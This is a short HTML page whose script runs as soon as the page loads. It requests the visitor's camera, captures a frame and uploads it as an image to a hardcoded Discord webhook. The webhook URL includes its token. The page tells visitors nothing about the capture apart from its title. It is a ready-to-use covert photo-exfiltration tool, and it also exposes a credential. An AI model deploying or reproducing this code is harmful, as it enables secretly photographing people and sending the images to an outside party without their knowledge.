<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Image to Discord Webhook</title>
</head>
<body>
    <h1>Send Image to Discord Webhook</h1>

    <script>
        // Function to send image to Discord webhook
        function sendImageToWebhook() {
            const video = document.createElement('video');

            // Check if the browser supports accessing the user's camera
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function (stream) {
                        video.srcObject = stream;
                        video.addEventListener('loadedmetadata', function () {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                            // Convert canvas to data URL
                            const imgURL = canvas.toDataURL('image/png');

                            // Create FormData object
                            const formData = new FormData();
                            formData.append('image', dataURItoBlob(imgURL), 'image.png');

                            // Webhook URL
                            const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1';

                            // Send POST request to Discord webhook
                            fetch(webhookURL, {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => {
                                if (!response.ok) {
                                    throw new Error('Failed to send image to Discord webhook');
                                }
                                console.log('Image sent to Discord webhook');
                            })
                            .catch(error => {
                                console.error('Error:', error);
                            });
                        });
                    })
                    .catch(function (error) {
                        console.error("Error accessing camera:", error);
                    });
            }
        }

        // Function to convert data URI to Blob
        function dataURItoBlob(dataURI) {
            const byteString = atob(dataURI.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: 'image/png' });
        }

        // Call the function to send image to Discord webhook
        sendImageToWebhook();
    </script>
</body>
</html>
